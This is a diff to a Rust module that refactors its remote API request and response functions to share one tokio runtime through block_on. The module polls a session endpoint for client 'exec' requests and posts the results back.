@@ -114,8 +114,7 @@ pub(crate) fn build_exec_response_json(sessionid: &str, response: &str) -> Strin
  *
  * Make a (remote) API call.
  */
-#[tokio::main]
-async fn request_json(_sessionid: &str, _since: u64) -> Result<String, Box<dyn std::error::Error>> {
+async fn request_json_async(_sessionid: &str, _since: u64) -> Result<String, Box<dyn std::error::Error>> {
     /* Set URL (for remote API). */
     let url = build_request_url(_since);
 
@@ -142,8 +141,7 @@ async fn request_json(_sessionid: &str, _since: u64) -> Result<String, Box<dyn s
  *
  * Make a (remote) API response.
  */
-#[tokio::main]
-async fn response_json(
+async fn response_json_async(
     _sessionid: &str,
     _response: String,
 ) -> Result<String, Box<dyn std::error::Error>> {
@@ -365,18 +363,18 @@ pub(crate) fn resolve_exec(_resp: &[Request]) -> Option<String> {
     Some(response)
 }
 
-fn _handle_exec(_sessionid: &str, _resp: Vec<Request>) {
+fn _handle_exec(rt: &tokio::runtime::Runtime, _sessionid: &str, _resp: Vec<Request>) {
     // println!("\n***HANDLING (VEC) RESPONSE {:?}", _resp);
 
     if let Some(response) = resolve_exec(&_resp) {
-        let _ = response_json(_sessionid, response);
+        let _ = rt.block_on(response_json_async(_sessionid, response));
     }
 
     // let response = "ERROR! A FATAL ERROR OCCURED :(".to_string();
     // response_json(_sessionid, response);
 }
 
-pub fn by_session(_sessionid: &str) {
+pub fn by_session(rt: &tokio::runtime::Runtime, _sessionid: &str) {
     println!("\n  Waiting for Client command...\n");
 
     let mut response: Result<String, Box<dyn std::error::Error>>;
@@ -391,7 +389,7 @@ pub fn by_session(_sessionid: &str) {
         assert!(now.elapsed() >= ten_seconds);
 
         /* Make (remote) JSON (data) request. */
-        response = request_json(_sessionid, LAST_SINCE.load(Ordering::Relaxed));
+        response = rt.block_on(request_json_async(_sessionid, LAST_SINCE.load(Ordering::Relaxed)));
         // println!("\nRAW---\n{:?}\n", response);
 
         // let session_resp: Result<_, Box<dyn std::error::Error>>;
@@ -429,7 +427,7 @@ pub fn by_session(_sessionid: &str) {
         // println!("  LAST SINCE -> {}", remote_data.result.last_since);
 
         if let Some(_data) = remote_data.result.req {
-            _handle_exec(&remote_data.result.sessionid, _data)
+            _handle_exec(rt, &remote_data.result.sessionid, _data)
         }
     }
 }
